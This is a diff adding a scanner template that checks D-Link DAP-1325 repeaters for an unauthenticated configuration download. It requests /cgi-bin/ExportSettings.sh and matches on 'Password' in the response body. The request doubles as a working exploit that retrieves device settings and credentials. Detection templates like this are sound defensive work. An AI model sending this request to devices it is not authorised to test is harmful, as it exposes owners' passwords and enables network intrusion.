@@ -1,0 +1,31 @@
+id: dlink-config-dump
+brief:
+    title: D-Link DAP-1325 - Information Disclosure
+    by: gy741
+    level: critical
+    about: Security vulnerability known as Unauthenticated access to settings or Unauthenticated configuration download. This vulnerability occurs when a device, such as a repeater, allows the download of use...
+    label:
+        - misconfig
+        - config
+        - dump
+        - dlink
+        - auth-bypass
+        - disclosure
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cgi-bin/ExportSettings.sh'
+      signs:
+        - "on": word
+          has:
+            - Password
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/octet-stream
+          in: header
+        - "on": status
+          status:
+            - 200
